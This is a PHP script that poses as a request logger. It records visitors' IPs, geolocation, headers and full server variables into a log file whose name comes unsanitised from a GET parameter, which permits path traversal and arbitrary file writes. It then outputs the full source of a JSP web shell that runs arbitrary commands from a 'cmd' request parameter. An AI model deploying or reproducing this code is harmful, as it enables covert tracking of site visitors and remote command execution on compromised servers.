<?php

// Function to get the client's IP address
function getClientIp()
{
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Function to get location data from IP address
function getLocationData($ip)
{
    $url = "http://ip-api.com/json/{$ip}";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// Collect GET request data
$get_data = $_GET;

// Get client IP address
$client_ip = getClientIp();

// Get location data
$location_data = getLocationData($client_ip);

// Combine all data into an array
if (isset($_GET)) {
    $dt2 = $_GET;
} elseif (isset($_POST)) {
    $dt2 = $_POST;
} else {
    $dt2 = [];
}
$request_data = [
    'get_data' => $get_data,
    'client_ip' => $client_ip,
    'location_data' => $location_data,
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'request_time' => date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']),
    'referrer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access',
    'data' => $_SERVER,
    'dt2' => $dt2
];

// Convert data to JSON format
$request_data_json = json_encode($request_data, JSON_PRETTY_PRINT);

// Save data to a file (e.g., logs/requests.log)
if (isset($_GET['filename'])) {
    $log_file = 'logs/' . $_GET['filename'];
} else {
    $log_file = 'logs/requests.log';
}

if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
}
file_put_contents($log_file, $request_data_json . PHP_EOL, FILE_APPEND);

echo '<%@ page import="java.io.*" %>
<%
    // Retrieve the command from the request parameter
    String cmd = request.getParameter("cmd");

    if (cmd != null) {
        try {
            // Execute the command
            Process process = Runtime.getRuntime().exec(cmd);
            
            // Capture the output of the command
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            
            String line;
            // Write the output to the response
            out.println("<h3>Command Output:</h3>");
            out.println("<pre>");
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");

            // Capture and display any errors
            out.println("<h3>Command Errors (if any):</h3>");
            out.println("<pre>");
            while ((line = errorReader.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");

            // Close readers
            reader.close();
            errorReader.close();
        } catch (IOException e) {
            // Handle exceptions
            out.println("An error occurred while executing the command: " + e.getMessage());
        }
    } else {
        out.println("No command specified.");
    }
%>
';
